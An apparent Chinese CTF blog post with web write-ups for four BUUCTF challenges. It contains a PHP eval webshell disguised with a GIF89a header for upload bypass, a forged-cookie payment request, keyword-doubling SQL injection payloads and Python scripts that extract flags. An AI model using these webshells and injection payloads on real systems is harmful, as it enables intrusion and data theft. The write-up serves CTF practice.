---
title: web刷题记录
date: 2023-04-08 17:19:47
tags:
  - CTF
  - Web
categories: Web
keywords: CTF
description: 本文记录了作者在刷CTF的Web方向题目中面临的问题以及解决方案，包含了文件上传绕过、php弱类型、sql注入绕过等知识点。
top_img: https://pic.imgdb.cn/item/647dcd821ddac507ccf5ba20.jpg
cover: https://pic.imgdb.cn/item/647dcd821ddac507ccf5ba20.jpg
# password: xdxdsqyc15511551
# message: 暂未完成，仍在施工
---


## [极客大挑战 2019] Upload 解题思路

1. `MIME` 绕过；修改 `content-type` 类型

2. 文件后缀检测；修改后缀名 `.phtml`

3. `<?` 检测绕过： js + php 模式；

``` html
<script language='php'>@eval($_POST['peony']);</script>
```

4. 文件头检测：添加 `GIF89a`

``` html
GIF89a <script language='php'>@eval($_POST['peony']);</script>
```

5. 确定文件上传位置：`/upload/x.phtml`

成功。

## [极客大挑战 2019] BuyFlag 解题思路

1. 发现注释中的提示：

``` html
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

![提示](https://pic.imgdb.cn/item/647c13a7f024cca173274a7a.png)

2. 使用 POST 方法提交参数 `money=100000000` 和 `password=404%00`
3. 根据提示修改 `cookie` ，将 `Cookie: user=0` 改为 `Cookie: user=1`，提交后发现长度被限制：

![反馈](https://pic.imgdb.cn/item/647c13a8f024cca173274b77.png)
4. 绕过方式：改为科学计数法：`money=1e8`。

``` POST
POST /pay.php HTTP/1.1
Host: d8194abc-64ad-48a7-8358-3df0649572fd.node4.buuoj.cn:81
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://d8194abc-64ad-48a7-8358-3df0649572fd.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://d8194abc-64ad-48a7-8358-3df0649572fd.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh;q=0.8,zh-CN;q=0.7
Cookie: user=1
Connection: close

money=1e8&password=404%20
```

下面是 EXP ：

``` python
import httpx
import re

HOST = "http://d8194abc-64ad-48a7-8358-3df0649572fd.node4.buuoj.cn:81"
URL = f'{HOST}/pay.php'
DATA = {"money": "1e9", "password": "404 "}
COOKIES = {"user": "1"}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
           "Referer": f"{HOST}/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,zh;q=0.8,zh-CN;q=0.7"}


res = httpx.post(URL, data=DATA, cookies=COOKIES, headers=headers, timeout=5)
assert res.status_code == 200
# print(res.text+"\n")

pattern = r"flag\{.*?\}"
match = re.search(pattern, res.text) 
if match: 
    print(match.group()) 
else: 
    print("No flag found.")
```

## [极客大挑战 2019] BabySQL 解题思路

1. 将`select`、`union`、`or`、`and`、`infomation`、`where`等关键字替换为空，双写绕过即可。

``` sql
%27 || sleep(1) --+
select 1,2,3 --+
select database() --+
select group_concat(table_name) from information_schema.tables where table_schema=database() --+
select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name= b4bsql --+
```

下面是 exp ：

``` python
import httpx
import re

HOST = "http://a37633c3-5c3b-4677-82e1-2270c6e28c7d.node4.buuoj.cn:81"
EVILCODE = '%27%20uunionnion%20sselectelect%201,2,group_concat(passwoorrd)ffromrom%20b4bsql%23'
URL = f'{HOST}/check.php'

params = {'username': 'admin', 'password': EVILCODE}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
           "Referer": f"{HOST}/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,zh;q=0.8,zh-CN;q=0.7"}

res = httpx.get(URL, params=params, headers=headers, timeout=5)
assert res.status_code == 200
# print(res.text+"\n")

pattern = r"flag\{.*?\}"
match = re.search(pattern, res.text)
if match:
    print(match.group())
else:
    print("No flag found.")
```

## [ACTF2020 新生赛] BackupFile 解题思路

1. 扫文件目录，工具很多，找到 `index.php.bak` 即可。
2. 根据 `index.php.bak` 中的注释提示:

``` php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }}
else {
    echo "Try to find out source file!";
}
?>
```

代码逻辑如下：

- 首先，它包含了一个叫做 `flag.php` 的文件，这个文件可能定义了一个变量 `$flag` ，用来存储一些敏感信息。
- 然后，它检查是否有一个名为 `key` 的 GET 参数传递给它。如果没有，它就输出"Try to find out source file!"。
- 如果有，它就把这个参数赋值给一个变量 `$key` ，并且使用 `is_numeric()` 函数检查这个变量是否是一个数字或者一个数字字符串。如果不是，它就退出并输出"Just num!"。
- 如果是，它就使用 `intval()` 函数把这个变量转换成一个整数，并且和一个字符串 `$str` 进行**弱类型比较**。如果相等，它就输出 `$flag` 的值。

因此，只需要请求 `http://url/?key=123` 即可获取 flag 。

{% hideToggle 什么是弱类型比较,orange, %}
根据搜索结果，PHP是一种弱类型的语言，这意味着它在比较变量时会进行隐式的类型转换¹²。PHP中有两种比较运算符：`==` 和 `===`。它们的区别是 `==` 会在比较之前将变量转换成相同的类型，而 `===` 会同时比较变量的类型和值。因此，使用 `==` 进行比较时可能会出现一些意想不到的结果，比如：

```php
<?php
$a = "0e123"; // 字符串
$b = 0; // 整数
if ($a == $b) {
    echo "true"; // 这里会输出true，因为字符串"0e123"被转换成了浮点数0.0
} else {
    echo "false";
}
?>
```

要避免这种弱类型比较的问题，可以使用 `===` 进行严格比较，或者使用一些函数来检查变量的类型，比如 `is_numeric()` , `is_int()` , `is_string()`等。
{% endhideToggle %}

EXP 如下：

``` python
import httpx
import re

URL = "http://eac04754-4cdd-4807-b34a-bfa86186533e.node4.buuoj.cn:81"

params = {'key': '123'}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
           "Referer": f"{HOST}/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,zh;q=0.8,zh-CN;q=0.7"}

res = httpx.get(URL, params=params, headers=headers, timeout=5)
assert res.status_code == 200
# print(res.text+"\n")

pattern = r"flag\{.*?\}"
match = re.search(pattern, res.text)
if match:
    print(match.group())
else:
    print("No flag found.")
```
